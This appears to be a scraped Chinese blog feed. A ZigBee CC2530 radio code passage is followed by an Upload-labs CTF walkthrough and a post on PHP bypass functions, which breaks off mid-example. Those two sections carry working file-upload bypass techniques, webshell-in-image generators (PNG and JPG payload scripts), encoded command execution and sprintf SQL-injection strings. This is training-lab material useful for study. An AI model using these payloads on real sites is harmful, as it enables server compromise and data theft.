&#x3D;(11+(25-11)*5);&#x2F;&#x2F;(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);                        &#x2F;&#x2F;设置载波为2475M    PAN_ID0&#x3D;0x07;    PAN_ID1&#x3D;0x20; &#x2F;&#x2F;0x2007   &#x2F;&#x2F;halRfRxInterruptConfig(basicRfRxFrmDoneIsr);        RFST &#x3D; 0xEC;&#x2F;&#x2F;清接收缓冲器    RFST &#x3D; 0xE3;&#x2F;&#x2F;开启接收使能     EA&#x3D;1;    &#125;void RFSend(char *pstr,char len)&#123;  char i;    RFST &#x3D; 0xEC; &#x2F;&#x2F;确保接收是空的    RFST &#x3D; 0xE3; &#x2F;&#x2F;清接收标志位    while (FSMSTAT1 &amp; 0x22);&#x2F;&#x2F;等待射频发送准备好    RFST &#x3D; 0xEE;&#x2F;&#x2F;确保发送队列是空    RFIRQF1 &amp;&#x3D; ~0x02;&#x2F;&#x2F;清发送标志位&#x2F;&#x2F;为数据发送做好准备工作    for(i&#x3D;0;i&lt;len;i++)    &#123;       RFD&#x3D;pstr[i];    &#125;  &#x2F;&#x2F;循环的作用是把我们要发送的数据全部压到发送缓冲区里面    RFST &#x3D; 0xE9; &#x2F;&#x2F;这个寄存器一旦被设置为0xE9,发送缓冲区的数据就被发送出去    while(!(RFIRQF1 &amp; 0x02) );&#x2F;&#x2F;等待发送完成    RFIRQF1 &#x3D; ~0x02;&#x2F;&#x2F;清发送完成标志&#125;void main()&#123;   LS164_Cfg();&#x2F;&#x2F;74LS164控制数码管的初始化   Init32M(); &#x2F;&#x2F;主时钟晶振工作在32M    KeysIntCfg();    halRfInit();&#x2F;&#x2F;无线通信的初始化  初始化相关的寄存器，配置工作信道，和PANID  SHORT_ADDR0&#x3D;0x50;  SHORT_ADDR1&#x3D;0x20;&#x2F;&#x2F;设置本模块地址  设置本模块的网络地址0x2050  &#x2F;&#x2F;大小端模式问题，    LS164_BYTE(1);     while(1);&#125;#pragma vector&#x3D;P1INT_VECTOR__interrupt void Key3_ISR() &#x2F;&#x2F;P1_1&#123;     if(0x02 &amp; P1IFG)     &#123;         Delay();         if(0&#x3D;&#x3D;P1_1)         &#123;           P1DIR |&#x3D;0X01;           P1_0 ^&#x3D;1;           RFSend(SendPacket,11);         &#125;     &#125;     P1IFG&#x3D;0;     P1IF&#x3D;0;&#125;#pragma vector&#x3D;RF_VECTOR__interrupt void RF_IRQ(void)&#123;&#x2F;&#x2F;这个是射频中断函数，当小灯模块接收到开关模块发送来的数据时，小灯模块的CPU就会进入中断函数执行    EA&#x3D;0;    if( RFIRQF0 &amp; 0x40 )    &#123;                    RFIRQF0&amp;&#x3D; ~0x40;   &#x2F;&#x2F; Clear RXPKTDONE interrupt    &#125;    S1CON&#x3D; 0;   &#x2F;&#x2F; Clear general RF interrupt flag    RFST &#x3D; 0xEC;&#x2F;&#x2F;清接收缓冲器    RFST &#x3D; 0xE3;&#x2F;&#x2F;开启接收使能     EA&#x3D;1;&#125;</code></pre><p>接收：</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;ioCC2530.h&gt;#include&quot;74LS164_8LED.h&quot;void Delay()&#123;    int y,x;    for(y&#x3D;1000;y&gt;0;y--)      for(x&#x3D;30;x&gt;0;x--);&#125;void Init32M()&#123;   SLEEPCMD &amp;&#x3D;0xFB;&#x2F;&#x2F;1111 1011 开启2个高频时钟源   while(0&#x3D;&#x3D;(SLEEPSTA &amp; 0x40));&#x2F;&#x2F; 0100 0000 等待32M稳定   Delay();   CLKCONCMD &amp;&#x3D;0xF8;&#x2F;&#x2F;1111 1000 不分频输出   CLKCONCMD &amp;&#x3D;0XBF;&#x2F;&#x2F;1011 1111 设置32M作为系统主时钟   while(CLKCONSTA &amp; 0x40); &#x2F;&#x2F;0100 0000 等待32M成功成为当前系统主时钟&#125;void Uart0_Cfg()&#123;   PERCFG &amp;&#x3D;0xFE;&#x2F;&#x2F;把这个寄存器的第零位强行清零  1111 1110    &#x2F;&#x2F;就是把串口0的脚位置配置在备用位置1 即P0_2  P0_3   P0SEL  |&#x3D;0x0C;&#x2F;&#x2F;让P0_2  P0_3这两个脚工作在片上外设模式,而不是普通IO口       0000 1100   U0CSR |&#x3D;0xC0;   U0UCR &#x3D;0; &#x2F;&#x2F;串口0 典型的串口配置  校验位 停止位之类的东西   U0GCR &#x3D;11;   U0BAUD &#x3D;216;&#x2F;&#x2F;就是重官方数据手册中波特率表格中参照115200时的 配置值，前提是系统时钟在32M   IEN0 |&#x3D;0x04; &#x2F;&#x2F;开接收数据的中断  0000 0100   EA&#x3D;1;&#125;void Uart0SendByte(char SendByte)&#123;    U0DBUF&#x3D;SendByte;  &#x2F;&#x2F;把我们收到的数据通过串口再返回发出去    while(UTX0IF&#x3D;&#x3D;0);    UTX0IF&#x3D;0;&#125;void halRfInit(void)&#123;    EA&#x3D;0;    FRMCTRL0 |&#x3D; 0x60;    &#x2F;&#x2F; Recommended RX settings      TXFILTCFG &#x3D; 0x09;    AGCCTRL1 &#x3D; 0x15;    FSCAL1 &#x3D; 0x00;    &#x2F;&#x2F; enable RXPKTDONE interrupt      RFIRQM0 |&#x3D; 0x40;    &#x2F;&#x2F; enable general RF interrupts    IEN2 |&#x3D; 0x01;    FREQCTRL &#x3D;(11+(25-11)*5);&#x2F;&#x2F;(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);        PAN_ID0&#x3D;0x07;    PAN_ID1&#x3D;0x20;    &#x2F;&#x2F;halRfRxInterruptConfig(basicRfRxFrmDoneIsr);        RFST &#x3D; 0xEC;&#x2F;&#x2F;清接收缓冲器    RFST &#x3D; 0xE3;&#x2F;&#x2F;开启接收使能     EA&#x3D;1;    &#125;void main()&#123;   LS164_Cfg();&#x2F;&#x2F;74LS164控制数码管的初始化   Init32M(); &#x2F;&#x2F;主时钟晶振工作在32M    halRfInit();   Uart0_Cfg();  SHORT_ADDR0&#x3D;0xEF;  SHORT_ADDR1&#x3D;0xBE;&#x2F;&#x2F;设置本模块地址  0xBEEF    LS164_BYTE(2);     while(1);&#125;void RevRFProc()&#123; static char len; static char  ch;    len&#x3D;ch&#x3D;0;    RFIRQM0 &amp;&#x3D; ~0x40;    IEN2 &amp;&#x3D; ~0x01;    EA&#x3D;1;    len&#x3D;RFD;&#x2F;&#x2F;读第一个字节判断这一串数据后面有几个字节；    &#x2F;&#x2F;len&#x3D;0x0C 12    while (len&gt;0)     &#123;&#x2F;&#x2F;只要后面还有数据那么就把他都从接受缓冲区取出来        ch&#x3D;RFD;        if(3&#x3D;&#x3D;len)        &#123;&#x2F;&#x2F;如果倒数第三个字节等于7，那么我们把LED0取反           LS164_BYTE(ch);        &#125;        len--;     &#125;         EA&#x3D;0;    &#x2F;&#x2F; enable RXPKTDONE interrupt    RFIRQM0 |&#x3D; 0x40;    &#x2F;&#x2F; enable general RF interrupts    IEN2 |&#x3D; 0x01;        &#125;#pragma vector&#x3D;RF_VECTOR__interrupt void RF_IRQ(void)&#123;&#x2F;&#x2F;这个是射频中断函数，当小灯模块接收到开关模块发送来的数据时，小灯模块的CPU就会进入中断函数执行    EA&#x3D;0;    if( RFIRQF0 &amp; 0x40 )    &#123;        RevRFProc();        RFIRQF0&amp;&#x3D; ~0x40;   &#x2F;&#x2F; Clear RXPKTDONE interrupt    &#125;    S1CON&#x3D; 0;                   &#x2F;&#x2F; Clear general RF interrupt flag    RFST &#x3D; 0xEC;&#x2F;&#x2F;清接收缓冲器    RFST &#x3D; 0xE3;&#x2F;&#x2F;开启接收使能     EA&#x3D;1;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs靶场</title>
      <link href="/posts/76ab3a0e/"/>
      <url>/posts/76ab3a0e/</url>
      
        <content type="html"><![CDATA[<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>前端验证，审查元素删除HTML中的onsubmit属性再上传即可</p><a id="more"></a><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>MIME验证抓包修改 <code>Content-Type</code> 为 <code>image/jpeg</code> 后Forward即可</p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>黑名单绕过，上传<code>.phtml</code>后缀即可</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>黑名单过滤了大多数后缀，于是上传<code>.htaccess</code>文件，内容如下，再上传后缀为<code>.jpg</code>的图片马即可</p><pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php</code></pre><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>黑名单过滤的绝大多数后缀名，并未进行大小写转换，于是上传<code>.Php</code>后缀即可</p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>黑名单绕过，抓包在后缀名最后加上一个空格即可上传绕过</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>没进行删除末尾的点的函数，抓包在后缀名后加上一个点即可</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>未过滤<code>::$DATA</code>，利用Windows解析特性，抓包在后缀名后面添加上<code>::$DATA</code>即可绕过</p><blockquote><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p></blockquote><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>此处文件路径拼接的是处理后的文件名，于是上传后缀为<code>php. .</code>的文件即可</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>函数将黑名单内的后缀名替换成空，这里双写后缀名<code>.pphphp</code>即可</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>白名单验证，提示上传路径可控，发现在上传一个文件之后就会get一个文件路径参数，于是利用%00截断，使得文件路径为upload/1.php%00(文件名)，后面的文件没就就没读取了，这样访问upload/1.php即可获得木马路径。</p><p>版本要求：</p><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p></blockquote><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>与上题不一样这题改用了POST方法，一样%00截断抓包改即可，php版本需要注意</p><blockquote><p>因为是十六进制所以这种截断叫做是<code>0x00截断</code>，其实是<code>%00截断</code>最终被<code>url解码</code>还是会变成<code>0x00</code>的。在<code>url</code>中<code>%00</code>表示<code>ascll</code>码中的<code>0</code>，而<code>ascii</code>中<code>0</code>作为特殊字符保留，表示字符串结束，所以当<code>url</code>中出现<code>%00</code>时就会认为读取已结束。</p></blockquote><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>cmd到两个文件所在路径下用copy命令制作图片马</p><blockquote><p>png：copy 1.png/b + 1.php/a shell.png</p><p>jpg：copy 1.jpg/b + 1.php/a shell.jpg</p><p>jpg：copy 1.gif/b + 1.php/a shell.gif</p></blockquote><p>制作好后上传，在文件包含漏洞页面getfile参数进行读取解析即可 <code>?file=./upload/6420200209090636.png</code>（三种都一样）</p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>后台代码改了，用的getimagesize函数判断后缀，但是解题方法还是和上题一样</p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>本题用了php_exif模块来判断文件类型，图片马一样可以绕过</p><blockquote><p>用于读取一个图像的第一个字节并检查其签名</p><p>如果发现了恰当的签名则返回一个对应的常量，否则返回false</p></blockquote><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>参考：<a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><p>这题存在对图片的二次渲染</p><h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>将做好的GIF图片马上传上去，利用文件包含漏洞进行读取，发现图片中的php代码并没有被解析，并且图片进行了二次渲染重构，内容被改写，于是使用GIF图的处理方法，将图片内容保存下来，与上传前的图片马作比较，发现有一部分没有被重写（如下图），于是将一句话插入到这一部分内容中，保存，重新上传，成功解析</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209171705862.png" alt loading="lazy"></p><h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><p>这里有国外大牛的脚本</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img &#x3D; imagecreatetruecolor(32, 32);for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;   $r &#x3D; $p[$y];   $g &#x3D; $p[$y+1];   $b &#x3D; $p[$y+2];   $color &#x3D; imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y &#x2F; 3), 0, $color);&#125;imagepng($img,&#39;.&#x2F;1.png&#39;);?&gt;</code></pre><p>但我TM竟然不知道<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>这个怎么利用？？？！！！</p><p>制作好png上传后下载下来成功镶入了那句话，但我还是不知道怎么用。。。算了先放这里</p><h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>在PLTE数据块后加入一句话</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209201526629.png" alt loading="lazy"></p><p>计算PLTE数据块的CRC<br>CRC脚本</p><pre class="language-python" data-language="python"><code class="language-python">import binasciiimport repng &#x3D; open(r&#39;2.png&#39;,&#39;rb&#39;)a &#x3D; png.read()png.close()hexstr &#x3D; binascii.b2a_hex(a)&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;data &#x3D;  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]crc &#x3D; binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffffprint hex(crc)</code></pre><p>运算结果：526579b0</p><p>修改CRC值</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209201005832.png" alt loading="lazy"></p><p>将这个图片上传就传上一句话了（反正我是没搞出来）。。。<a href="https://github.com/Yang1k/upload-labs-Pass16">原文中素材链接</a></p><h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><p>首先准备一张.jpg后缀的文件，上传上去然后将二次渲染后的图片下载下来命名为1.jpg</p><p>然后上国外大佬脚本，并且命名为<code>jpg_payload.php</code></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    &#x2F;*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg&gt;    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;    *&#x2F;    $miniPayload &#x3D; &quot;&lt;?&#x3D;phpinfo();?&gt;&quot;; &#x2F;*这里插入想插入的一句话代码*&#x2F;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;        die(&#39;php-gd is not installed&#39;);    &#125;    if(!isset($argv[1])) &#123;        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize &#x3D; $pad;        $dis &#x3D; new DataInputStream($argv[1]);        $outStream &#x3D; file_get_contents($argv[1]);        $extraBytes &#x3D; 0;        $correctImage &#x3D; TRUE;        if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;            die(&#39;Incorrect SOI marker&#39;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;            $marker &#x3D; $dis-&gt;readByte();            $size &#x3D; $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;                $startPos &#x3D; $dis-&gt;seek();                $outStreamTmp &#x3D;                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !&#x3D;&#x3D; 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;                            if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos &#x3D; $dis-&gt;seek() - 2;                    $imageStreamSize &#x3D; $stopPos - $startPos;                    $outStream &#x3D;                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream &#x3D; $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;                    die(&#39;Success!&#39;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage &#x3D; TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage &#x3D; FALSE;        if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes &#x3D; (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;            $this-&gt;binData &#x3D; &#39;&#39;;            $this-&gt;order &#x3D; $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData &#x3D; file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData &#x3D; $filename;            &#125;            $this-&gt;size &#x3D; strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#39;End Of File&#39;);            &#125;            $byte &#x3D; substr($this-&gt;binData, 0, 1);            $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#39;End Of File&#39;);            &#125;            $short &#x3D; substr($this-&gt;binData, 0, 2);            $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);        &#125;    &#125;?&gt;</code></pre><p>然后执行命令<code>php jpg_payload.php 1.jpg</code></p><p>显示<code>Success!</code>即成功，装换后的文件名为<code>payload_1.jpg</code></p><p>将<code>payload_1.jpg</code>上传，php代码成功被解析</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>条件竞争，利用burp的intruder模块，不停的发送数据包，就可以连接上，我硬是开了3个intruder模块才访问的到网页</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209211644172.png" alt loading="lazy"></p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>同样条件竞争，让发包的速度快过函数rename()的速度即可成功上传</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209212552816.png" alt loading="lazy"></p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>保存名称那里在后缀，名加上一个<code>/.</code> 、<code>.(空格)</code>或<code>.</code>；<code>move_uploaded_file()</code>还有一个特性，会忽略掉文件末尾的<code>.</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209213807846.png" alt loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> uploads </tag>
            
            <tag> 靶场 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些PHP函数</title>
      <link href="/posts/4eec4e89/"/>
      <url>/posts/4eec4e89/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过函数"><a href="#绕过函数" class="headerlink" title="绕过函数"></a>绕过函数</h2><h3 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert"></a>base_convert</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206145300281.png" style="zoom:67%;" loading="lazy"><p>可用以绕过执行一些系统命令</p><pre class="language-php" data-language="php"><code class="language-php">base_convert(&#39;phpinfo&#39;,36,10) &#x3D;&#x3D;&gt; 55490343972</code></pre><pre class="language-php" data-language="php"><code class="language-php">base_convert(55490343972,10,36)() &#x3D;&#x3D;&gt; phpinfo()</code></pre><h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206150504686.png" style="zoom:67%;" loading="lazy"><h3 id="dechex"><a href="#dechex" class="headerlink" title="dechex"></a>dechex</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206150752364.png" style="zoom:67%;" loading="lazy"><h3 id="hexdec"><a href="#hexdec" class="headerlink" title="hexdec"></a>hexdec</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206151951567.png" style="zoom:67%;" loading="lazy"><p>例：cat *的16进制为636174202a</p><pre class="language-php" data-language="php"><code class="language-php">hexdec(636174202a) &#x3D;&#x3D;&gt; 426836762666</code></pre><pre class="language-php" data-language="php"><code class="language-php">hex2bin(dechex(426836762666)) &#x3D;&#x3D;&gt; cat *</code></pre><h2 id="读取数据函数"><a href="#读取数据函数" class="headerlink" title="读取数据函数"></a>读取数据函数</h2><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206153405574.png" style="zoom:67%;" loading="lazy"><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206153545427.png" style="zoom:67%;" loading="lazy"><h3 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206154027139.png" style="zoom:67%;" loading="lazy"><h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206154243939.png" style="zoom:67%;" loading="lazy"><pre class="language-php" data-language="php"><code class="language-php">var_dump(scandir(chr(47)))    读取当前目录文件</code></pre><h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200315185811823.png" alt loading="lazy"></p><p>可现显示php代码，用于<code>data://</code>协议中来读取代码</p><h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p><code>int strcmp(string $str1, string $str2)</code></p><p><code>str1</code>为第一个字符串，<code>str2</code>为第二个字符串，如果<code>str1</code>小于<code>str2</code>返回<code>&lt;0</code>如果<code>str1</code>大于<code>str2</code>返回<code>&gt;0</code>；如果二者相等，返回<code>0</code></p><p>但是当我们传入数组的时候，函数接收到不合法的字符后会报错，但是在php5.3之前的php中，显示了报错的警告信息后将<code>return 0</code>；意思是就算报了错，但判定结果还是相等的，即可通过数组进行绕过</p><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h3><p>函数检测变量是否为数字或数字字符串，是则返回<code>true</code>，否则返回<code>false</code>，但是该函数对于空字符（如：<code>%00</code>，<code>%20</code>）则会直接跳过空字符判断，执行后面的语句，是判断则会接着继续后面的判断，注：<code>%20</code>放在字符串首则无效，例：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200229210728123.png" alt loading="lazy"></p><h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h3><p>参考：<a href="http://bey0nd.xyz/2018/11/05/1/">http://bey0nd.xyz/2018/11/05/1/</a></p><pre class="language-none"><code class="language-none">sprintf(format,arg1,arg2,arg++)arg1、arg2、arg++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 &quot;\$&quot; 组成。</code></pre><p><strong>反斜杠单引号逃逸</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$sql &#x3D; &quot;select * from user where username &#x3D; &#39;%\&#39; and 1&#x3D;1#&#39;;&quot; ;$args &#x3D; &quot;admin&quot; ;echo  sprintf ( $sql , $args ) ;</code></pre><p>=&gt; <code>echo sprintf(&quot;select * from user where username = &#39;%\&#39; and 1=1#&#39;;&quot;, &quot;admin&quot;);</code><br>此时%\回去匹配admin字符串，但是<code>%\</code>只会匹配空<br>运行后的结果<br><code>select * from user where username = &#39;&#39; and 1=1#&#39;</code></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$input &#x3D; addslashes (&quot;%1$&#39; and 1&#x3D;1#&quot; );$b &#x3D; sprintf (&quot;AND b&#x3D;&#39;%s&#39;&quot;, $input );$sql &#x3D; sprintf (&quot;SELECT * FROM t WHERE a&#x3D;&#39;%s&#39; $b &quot;, &#39;admin&#39; );</code></pre><p>对<code>$input</code>与<code>$b</code>进行了拼接<br><code>$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#39;%s&#39; AND b=&#39;%1$\&#39; and 1=1#&#39; &quot;, &#39;admin&#39; );</code><br>很明显，这个句子里面的<code>\</code>是由<code>addsashes</code>为了转义单引号而加上的，使用<code>%s</code>与<code>%1$\</code>类匹配<code>admin</code>，那么<code>admin</code>只会出现在<code>%s</code>里，<code>%1$\</code>为空<br><code>echo  $sql ;</code><br>运行后的结果<br><code>SELECT * FROM t WHERE a=&#39;admin&#39; AND b=&#39;&#39; and 1=1#&#39;</code></p><p><strong>%c利用</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;? php$input1 &#x3D; &#39;%1$c) OR 1 &#x3D; 1 &#x2F;*&#39; ;$input2 &#x3D; 39 ;$sql &#x3D; &quot;SELECT * FROM foo WHERE bar IN (&#39; $input1 &#39;) AND baz &#x3D; %s&quot; ;$sql &#x3D; sprintf ( $sql , $input2 );echo  $sql 